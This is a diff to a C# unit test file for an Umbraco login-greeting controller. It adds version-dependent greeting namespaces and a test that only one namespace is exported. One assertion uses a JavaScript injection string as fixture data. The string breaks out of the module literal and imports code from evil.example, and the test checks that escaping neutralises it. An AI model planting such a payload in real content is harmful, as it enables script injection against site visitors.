@@ -26,6 +26,15 @@ public sealed class RuntimeControllerTests : IDisposable
 	private static readonly IRuntimeState RunningRuntimeState =
 		Mock.Of<IRuntimeState>(state => state.Level == RuntimeLevel.Run);
 
+#if UMBRACO_17
+	// Umbraco 17's login page reads auth_greeting0..6 and nothing else.
+	private const string GreetingNamespace = "auth";
+#else
+	// Umbraco 18's login page reads login_greeting0..6. It would still use an auth_greeting
+	// key, but logs a deprecation warning for it (removal in Umbraco 20).
+	private const string GreetingNamespace = "login";
+#endif
+
 	[Fact]
 	public async Task GetActive_Returns_NoContent_Without_Store_Access_During_Installation()
 	{
@@ -611,11 +620,58 @@ public sealed class RuntimeControllerTests : IDisposable
 		Assert.Equal("text/javascript; charset=utf-8", result.ContentType);
 		Assert.Equal("no-store", controller.Response.Headers.CacheControl);
 
-		var login = ParseModuleDefaultExport(result.Content!).GetProperty("login");
+		var greetings = ParseModuleDefaultExport(result.Content!).GetProperty(GreetingNamespace);
 		for (var day = 0; day < 7; day++)
 		{
-			Assert.Equal("För framtiden", login.GetProperty($"greeting{day}").GetString());
+			Assert.Equal("För framtiden", greetings.GetProperty($"greeting{day}").GetString());
 		}
+	}
+
+	[Fact]
+	public async Task GreetingModule_Exports_Only_The_Namespace_This_Umbraco_Versions_Login_Page_Reads()
+	{
+		WriteConfig("""
+		{
+		  "assets": [
+		    {
+		      "id": "asset-rule",
+		      "name": "Matched",
+		      "kind": 0,
+		      "altText": null,
+		      "greetingText": "Hej",
+		      "logoAssetId": null,
+		      "storagePath": "assets/rule-background.png",
+		      "publicPath": null,
+		      "width": 1920,
+		      "height": 1080,
+		      "createdAt": "2026-05-16T00:00:00Z",
+		      "updatedAt": "2026-05-16T00:00:00Z"
+		    }
+		  ],
+		  "rules": [
+		    {
+		      "id": "rule-1",
+		      "name": "Catch-all",
+		      "priority": 100,
+		      "enabled": true,
+		      "condition": "{\"and\":[]}",
+		      "assetId": "asset-rule"
+		    }
+		  ],
+		  "settings": {
+		    "publicEndpointCacheSeconds": 300
+		  }
+		}
+		""");
+
+		var controller = CreateGreetingController(new DateTimeOffset(2026, 5, 18, 9, 0, 0, TimeSpan.Zero));
+
+		var result = Assert.IsType<ContentResult>(await controller.GreetingModule());
+
+		// A second namespace is not harmless: on Umbraco 18 an auth_greeting key wins over
+		// login_greeting and logs a deprecation warning on every login-page load.
+		var namespaces = ParseModuleDefaultExport(result.Content!).EnumerateObject().Select(property => property.Name);
+		Assert.Equal([GreetingNamespace], namespaces);
 	}
 
 	[Fact]
@@ -728,8 +784,8 @@ public sealed class RuntimeControllerTests : IDisposable
 
 		// The payload between `export default ` and the trailing `;` must stay a single
 		// JSON literal — a greeting containing quotes or braces must round-trip intact.
-		var login = ParseModuleDefaultExport(result.Content!).GetProperty("login");
-		Assert.Equal("\"};import('https://evil.example');//", login.GetProperty("greeting0").GetString());
+		var greetings = ParseModuleDefaultExport(result.Content!).GetProperty(GreetingNamespace);
+		Assert.Equal("\"};import('https://evil.example');//", greetings.GetProperty("greeting0").GetString());
 	}
 
 	private RuntimeController CreateGreetingController(DateTimeOffset localNow)
